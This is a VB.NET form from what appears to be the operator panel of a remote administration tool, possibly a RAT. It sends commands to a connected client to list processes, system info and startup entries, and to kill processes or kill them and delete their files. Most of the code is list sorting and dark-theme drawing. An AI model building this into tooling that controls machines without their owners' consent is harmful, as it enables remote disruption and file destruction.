Public Class System_Manager

    Public M As Main
    Public C As S_Client
    Private m_SortingColumn As ColumnHeader

    Private Sub lvwBooks_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L2.ColumnClick
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L2.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L2.ListViewItemSorter = New Main.ListViewComparer(e.Column, sort_order)

        ' Sort.
        L2.Sort()
    End Sub

    Private Sub System_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ContextMenuStrip1.Renderer = New MyRenderer()
        ContextMenuStrip2.Renderer = New MyRenderer()
        ContextMenuStrip3.Renderer = New MyRenderer()
    End Sub



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Not C.IsConnected Then
            Me.Close()
        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0) Then
                Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch exception As Exception
        End Try
    End Sub


    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        C.BeginSend("Sysinfo")
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        C.BeginSend("PROC")
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        C.BeginSend("STUP")
    End Sub

    Private Sub System_Manager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        C.BeginSend("Close")
    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L2.SelectedItems
            C.BeginSend("PROCKILL" + M.SPL + x.SubItems(1).Text.ToString)
        Next
    End Sub

    Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillDeleteToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L2.SelectedItems
            C.BeginSend("PROCDEL" + M.SPL + x.SubItems(1).Text.ToString + M.SPL + x.SubItems(2).Text.ToString)
        Next
    End Sub

    Private Sub L2_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L2.DrawColumnHeader
        Dim BL As New SolidBrush(Color.FromArgb(17, 17, 17))
        Dim LM As New SolidBrush(Color.FromArgb(142, 188, 0))
        e.DrawBackground()
        e.Graphics.FillRectangle(BL, e.Bounds)
        Dim headerFont As New Font("Segoe UI", 8, FontStyle.Bold)
        e.Graphics.DrawString(e.Header.Text, headerFont, LM, e.Bounds)
    End Sub

    Private Sub L2_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L2.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub L2_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L2.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(142, 188, 0)), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Segoe UI", 8, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17))
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private Sub System_Manager_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub MetroTabPage2_Enter(sender As Object, e As EventArgs) Handles MetroTabPage2.Enter
        C.BeginSend("PROC")
    End Sub

    Private Sub MetroTabPage3_Enter(sender As Object, e As EventArgs) Handles MetroTabPage3.Enter
        C.BeginSend("STUP")
    End Sub

End Class

Public Class MyRenderer
    Inherits ToolStripProfessionalRenderer
    Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
        Dim rc As New Rectangle(Point.Empty, e.Item.Size)
        Dim c As Color = IIf(e.Item.Selected, Color.FromArgb(99, 131, 0), Color.FromArgb(17, 17, 17))
        Using brush As New SolidBrush(c)
            e.Graphics.FillRectangle(brush, rc)
        End Using
    End Sub
End Class